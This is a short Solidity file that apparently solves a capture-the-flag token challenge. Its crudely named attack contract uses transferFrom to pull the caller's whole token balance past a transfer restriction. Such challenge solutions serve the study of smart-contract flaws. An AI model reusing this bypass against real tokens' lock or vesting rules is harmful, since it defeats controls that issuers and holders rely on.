// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
  function transferFrom(address from, address to, uint256 amount) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
}

// Call this function after giving allowance for all your token balance to address(this)
contract NaughtyCoinFucker {
  function attack(address _a) external {
    IERC20(_a).transferFrom(msg.sender, address(this), IERC20(_a).balanceOf(msg.sender));
  }
}
